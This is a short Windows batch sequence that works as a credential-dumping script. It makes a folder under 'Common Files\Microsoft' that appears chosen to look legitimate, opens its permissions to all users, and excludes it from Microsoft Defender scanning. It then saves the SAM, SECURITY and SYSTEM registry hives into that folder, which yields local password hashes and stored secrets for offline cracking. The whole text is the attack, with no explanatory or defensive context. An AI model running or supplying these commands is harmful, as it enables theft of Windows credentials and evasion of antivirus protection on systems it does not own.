md "C:\Program Files\Common Files\Microsoft"
icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F
powershell -command "Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft'"
reg.exe save hklm\sam "C:\Program Files\Common Files\Microsoft\sam.save"
reg.exe save hklm\security "C:\Program Files\Common Files\Microsoft\security.save"
reg.exe save hklm\system "C:\Program Files\Common Files\Microsoft\system.save"
cd "C:\Program Files\Common Files\Microsoft"
